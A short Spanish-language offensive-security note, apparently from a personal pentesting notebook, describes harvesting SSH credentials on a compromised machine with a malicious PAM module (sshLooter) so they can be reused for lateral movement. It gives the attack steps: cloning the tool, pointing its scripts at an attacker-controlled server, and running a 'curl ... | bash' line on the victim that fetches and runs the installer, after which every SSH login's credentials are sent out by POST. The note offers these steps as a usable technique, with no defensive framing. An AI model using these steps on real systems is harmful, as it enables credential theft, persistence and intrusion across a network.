
Supón que as comprometido una máquina remota y eres root. Y quieres coleccionar cuantas más credenciales sean posibles para moverte lateralmente aprovechando *casos de reuso de credenciales*.

Lo que podemos hacer es robar las credenciales SSH a través de un [malicious PAM module](https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html?lipi=urn:li:page:d_flagship3_feed;6EEiLAg8RlyAOl67hZyVRA==)

A través de este módulo PAM malicioso, cualquier intento de conexión SSH va a ser reenviado(forwarded) a un servidor bajo tu control, acompañado de las credenciales usadas para ese intento de conexión.

*Ejemplo*:

En nuestra máquina atacante:

```
git clone https://github.com/mthbernardes/sshLooter.git
cd sshLooter
```

Hostear y editar el *install.sh* y *looter.py*, indicando la variable *url* a un servidor bajo nuestro control, el cual pueda capturar POST requests.

En la máquina comprometida:

```
curl http://IPkali:puerto/install.sh | bash
```

Y en nuestro servidor veremos algo así:

![[Pasted image 20230129173536.png]]

Ahora podemos tratar de usar las credenciales capturadas en otras máquinas en la red.

